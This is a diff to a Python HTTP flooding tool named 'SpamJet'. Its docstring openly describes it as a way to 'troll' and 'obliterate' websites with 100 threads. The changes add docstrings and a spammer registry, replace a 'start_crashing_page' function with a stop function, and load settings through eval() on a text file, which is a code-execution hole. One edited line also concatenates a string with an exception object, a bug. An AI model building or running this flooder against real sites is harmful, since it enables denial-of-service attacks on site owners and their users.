@@ -8,11 +8,12 @@ from time import sleep, time
 __doc__ = """Tool for stress-testing (trolling) websites ;)
 100 threads for best performance, obliterates middle-end websites"""
 
-__version__ = "SpamJet API 1.01"
+__version__ = "SpamJet API 1.02"
 
 
 class HttpSpammer:
     def __init__(self, verbose = False):
+        """Create a new HttpSpammer and append a reference to list `all_spammers`."""
         self.target = None
         self.isactive = False
         self.isconnected = False
@@ -23,6 +24,7 @@ class HttpSpammer:
         self.all_prepped_packets = []
         
         self.thread_count = 0
+        all_spammers.append(self)
 
     def spam_thread(self, thread_index):
         while self.isactive:
@@ -32,9 +34,9 @@ class HttpSpammer:
                 else:
                     self.all_sessions[thread_index].send(self.all_prepped_packets[thread_index])
 
-            except Exception as e:  # Usually caused by server actively refusing connection
+            except ConnectionRefusedError as e:  # Usually caused by server actively refusing connection
                 if self.verbose:
-                    print(e)
+                    print('ERROR: ' + e)
 
     def connect(self, url, thread_count, mode = 'GET', body = '', user_agent = 'Mozilla/5.0'):
         if self.isconnected:
@@ -59,6 +61,8 @@ class HttpSpammer:
                 self.thread_count = thread_count
                 
             except requests.exceptions.MissingSchema:
+                # Much more lenient than failing silently, user
+                # will definitely know they mistyped the address.
                 print(f'Failed to connect to {url}.', file=sys.stderr)
                 self.isconnected = False
 
@@ -73,6 +77,9 @@ class HttpSpammer:
     def stop(self):
         self.isactive = False
 
+with open('settings.txt', mode='r') as settingsfile:
+    settings = eval(settingsfile.read())
+
 all_spammers = []
 
 def stop_all():
@@ -81,8 +88,9 @@ def stop_all():
 
     all_spammers.clear()  # Discard all references to spammers
 
-def start_crashing_page():  # Change this to read from a file or frontend
-    url = input('URL to website: \n')
-    spammer = HttpSpammer()
-    spammer.connect(url, settings['threads'])
-    spammer.start()
+def stop_spammers(target):
+    """Stop all spammers with given target"""
+    for spammer in all_spammers.copy():
+        if spammer.target == target:
+            spammer.stop()
+            all_spammers.remove(spammer)
